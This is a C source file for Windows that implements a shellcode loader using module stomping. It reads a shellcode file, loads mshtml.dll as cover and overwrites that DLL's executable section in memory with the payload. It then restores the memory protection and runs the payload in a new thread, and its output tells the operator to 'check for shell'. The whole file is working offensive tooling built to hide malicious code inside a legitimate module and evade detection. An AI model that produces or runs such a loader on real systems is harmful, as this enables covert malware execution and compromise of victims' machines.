#include <windows.h>
#include <stdio.h>
#include <winnt.h>

// Function to perform module stomping
BOOL ModuleStomp(unsigned char* shellcode, size_t shellcode_size);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <path_to_shellcode.bin>\n", argv[0]);
        return 1;
    }

    // Read shellcode from file
    FILE *fp = fopen(argv[1], "rb");
    if (!fp) {
        perror("Failed to open shellcode file");
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
    if (!shellcode) {
        perror("Failed to allocate memory for shellcode");
        fclose(fp);
        return 1;
    }

    size_t bytes_read = fread(shellcode, 1, shellcode_size, fp);
    if (bytes_read != shellcode_size) {
        perror("Failed to read shellcode file completely");
        free(shellcode);
        fclose(fp);
        return 1;
    }
    fclose(fp);

    printf("[+] Shellcode read from %s (%zu bytes)\n", argv[1], shellcode_size);

    // Perform module stomping
    if (!ModuleStomp(shellcode, shellcode_size)) {
        printf("[-] Module stomping failed.\n");
        free(shellcode);
        return 1;
    }

    printf("[+] Module stomping appears to have been successful. Check for shell.\n");
    free(shellcode);
    return 0;
}

BOOL ModuleStomp(unsigned char* shellcode, size_t shellcode_size) {
    // 1. Load a legitimate DLL. mshtml.dll is a large, common, and non-critical module.
    const char* target_module = "mshtml.dll";
    HMODULE hModule = LoadLibraryA(target_module);
    if (hModule == NULL) {
        printf("[-] Failed to load %s. Error: %lu\n", target_module, GetLastError());
        return FALSE;
    }
    printf("[+] Loaded %s at base address: 0x%p\n", target_module, (void*)hModule);

    // 2. Parse PE headers to find the .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER textSection = NULL;

    // Iterate through sections to find the first executable one (usually .text)
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            textSection = sectionHeader;
            printf("[+] Found executable section '%s' at RVA 0x%X\n", textSection->Name, textSection->VirtualAddress);
            break;
        }
        sectionHeader++;
    }

    if (textSection == NULL) {
        printf("[-] Could not find an executable section.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    // 3. Check if the section is large enough for our shellcode
    if (textSection->SizeOfRawData < shellcode_size) {
        printf("[-] Executable section is too small (%u bytes) for the shellcode (%zu bytes).\n", textSection->SizeOfRawData, shellcode_size);
        FreeLibrary(hModule);
        return FALSE;
    }
    printf("[+] Section size (%u bytes) is sufficient for shellcode (%zu bytes).\n", textSection->SizeOfRawData, shellcode_size);

    // 4. Change memory permissions to RW
    LPVOID textSectionAddress = (LPVOID)((LPBYTE)hModule + textSection->VirtualAddress);
    DWORD oldProtect;
    if (!VirtualProtect(textSectionAddress, shellcode_size, PAGE_READWRITE, &oldProtect)) {
        printf("[-] Failed to change memory permissions to RW. Error: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }
    printf("[+] Changed memory permissions to PAGE_READWRITE.\n");

    // 5. Copy the shellcode into the section
    memcpy(textSectionAddress, shellcode, shellcode_size);
    printf("[+] Copied shellcode to target section.\n");

    // 6. Restore memory permissions to RX
    if (!VirtualProtect(textSectionAddress, shellcode_size, oldProtect, &oldProtect)) {
        printf("[-] Failed to restore memory permissions. Error: %lu\n", GetLastError());
        // Continue anyway, but this is not ideal
    }
    printf("[+] Restored memory permissions.\n");

    // 7. Execute the shellcode in a new thread
    printf("[*] Executing shellcode...\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)textSectionAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] Failed to create thread. Error: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }

    // Wait for the thread to finish (optional, but good for stability)
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    FreeLibrary(hModule);

    return TRUE;
}